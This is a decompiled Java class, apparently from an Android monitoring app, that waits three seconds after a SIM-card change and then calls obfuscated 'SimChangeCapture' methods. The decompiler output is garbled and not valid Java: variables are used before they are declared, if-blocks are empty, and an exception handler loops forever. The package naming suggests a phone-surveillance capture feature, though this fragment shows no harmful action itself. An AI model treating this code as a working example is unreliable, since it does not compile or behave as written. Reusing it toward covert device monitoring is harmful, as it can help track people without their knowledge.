package com.vvt.capture.simchange;

import android.os.SystemClock;

class e
  implements Runnable
{
  e(SimChangeCapture.SimChangedReceiver paramSimChangedReceiver) {}
  
  public void run()
  {
    long l = 3000L;
    SystemClock.sleep(l);
    try
    {
      bool = SimChangeCapture.d();
      if (bool) {}
      localObject1 = this.a;
      localObject1 = ((SimChangeCapture.SimChangedReceiver)localObject1).a;
      SimChangeCapture.a((SimChangeCapture)localObject1);
      localObject1 = this.a;
    }
    catch (Exception localException)
    {
      for (;;)
      {
        Object localObject1;
        boolean bool = SimChangeCapture.e();
        if (bool) {}
        SimChangeCapture.SimChangedReceiver localSimChangedReceiver = this.a;
      }
    }
    finally
    {
      SimChangeCapture.SimChangedReceiver.a(this.a, null);
    }
    SimChangeCapture.SimChangedReceiver.a((SimChangeCapture.SimChangedReceiver)localObject1, null);
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/simchange/e.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */